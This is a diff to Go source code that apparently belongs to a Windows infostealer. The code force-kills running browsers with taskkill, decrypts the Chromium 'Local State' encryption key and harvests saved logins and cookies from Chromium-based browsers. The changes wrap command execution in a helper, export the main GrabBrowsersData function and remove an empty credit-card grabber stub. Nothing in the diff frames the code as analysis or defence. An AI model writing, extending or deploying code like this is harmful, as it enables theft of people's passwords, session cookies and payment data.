@@ -8,7 +8,6 @@ import (
 	"encoding/json"
 	"errors"
 	"os"
-	"os/exec"
 	"strings"
 
 	_ "github.com/mattn/go-sqlite3"
@@ -62,7 +61,7 @@ var logins []BrowserLoginResult
 var cookies []BrowserCookieResult
 
 func killBrowserProcesses() error {
-	running, err := exec.Command("tasklist").Output()
+	running, err := executeCommand("tasklist").Output()
 	if err != nil {
 		return err
 	}
@@ -73,7 +72,7 @@ func killBrowserProcesses() error {
 		if !strings.Contains(runningProcesses, process) {
 			continue
 		}
-		err := exec.Command("taskkill", "/F", "/IM", process).Run()
+		err := executeCommand("taskkill", "/F", "/IM", process).Run()
 		if err != nil {
 			// Ignore "process not found" errors
 			if !strings.Contains(err.Error(), "exit status 128") {
@@ -214,10 +213,6 @@ func grabChromiumCookies(key []byte, path string, browserName string) error {
 	return nil
 }
 
-func grabCreditsCardData() {
-
-}
-
 func grabChromiumData(path string, name string) error {
 	encryptionKey, err := decryptKey(path + `\Local State`)
 	if err != nil || encryptionKey == nil {
@@ -236,7 +231,7 @@ func grabChromiumData(path string, name string) error {
 	return nil
 }
 
-func grabBrowsersData() {
+func GrabBrowsersData() {
 	_ = killBrowserProcesses()
 
 	for name, path := range ChromiumBrowserPaths {
